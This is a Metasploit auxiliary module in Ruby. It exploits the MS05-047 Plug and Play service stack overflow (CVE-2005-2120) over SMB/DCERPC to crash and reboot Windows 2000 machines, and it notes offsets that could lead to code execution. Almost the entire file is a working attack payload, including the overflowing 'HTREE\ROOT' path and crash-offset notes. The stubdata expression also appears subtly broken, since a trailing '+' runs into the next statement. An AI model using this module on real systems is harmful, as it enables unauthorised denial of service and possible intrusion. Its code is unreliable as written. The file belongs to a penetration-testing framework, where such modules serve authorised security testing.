##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::DCERPC
  include Msf::Exploit::Remote::SMB
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Microsoft Plug and Play Service Registry Overflow',
      'Description'    => %q{
          This module triggers a stack buffer overflow in the Windows Plug
        and Play service. This vulnerability can be exploited on
        Windows 2000 without a valid user account. Since the PnP
        service runs inside the service.exe process, this module
        will result in a forced reboot on Windows 2000. Obtaining
        code execution is possible if user-controlled memory can
        be placed at 0x00000030, 0x0030005C, or 0x005C005C.
      },
      'Author'         => [ 'hdm' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2005-2120' ],
          [ 'MSB', 'MS05-047' ],
          [ 'BID', '15065' ],
          [ 'OSVDB', '18830' ]
        ]
      ))

    register_options(
      [
        OptString.new('SMBPIPE', [ true,  "The pipe name to use (browser, srvsvc, wkssvc, ntsvcs)", 'browser']),
      ], self.class)
  end

=begin

/* Function 0x0a at 0x767a54a8 */
long function_0a (
  [in] [unique] [string] wchar_t * arg_00,
  [out] [size_is(*arg_02)] [length_is(*arg_02)] wchar_t * arg_01,
  [in,out] long * arg_02,
  [in] long arg_03
);

=end

  def run

    # Determine which pipe to use
    pipe = datastore['SMBPIPE']

    print_status("Connecting to the SMB service...")
    connect()
    smb_login()


    # Results of testing on Windows 2000 SP0
    #  324 / 325 exception handled
    #  326 write to 0
    #  327 jump to 00000030
    #  328 jump to 0030005C
    #  329 jump to 005C005C

    # Completely smash the process stack
    i = 1024

    handle = dcerpc_handle('8d9f4e40-a03d-11ce-8f69-08003e30051b', '1.0', 'ncacn_np', ["\\#{pipe}"])
    print_status("Binding to #{handle} ...")
    dcerpc_bind(handle)
    print_status("Bound to #{handle} ...")

    path = "HTREE\\ROOT" + ("\\" * i)

    # 0 = nil, 1 = enum, 2/3 = services, 4 = enum (currentcontrolset|caps)

    stubdata =
      NDR.long(rand(0xffffffff)) +
      NDR.wstring(path) +
      NDR.long(4) +
      NDR.long(1) +

    print_status("Calling the vulnerable function...")

    begin
      dcerpc.call(0x0a, stubdata)
    rescue Rex::Proto::DCERPC::Exceptions::NoResponse
      print_good('Server did not respond, this is expected')
    rescue ::Errno::ECONNRESET
      print_good('Connection reset by peer (possible success)')
    rescue => e
      if e.to_s =~ /STATUS_PIPE_DISCONNECTED/
        print_good('Server disconnected, this is expected')
      else
        raise e
      end
    end

    disconnect
  end

end
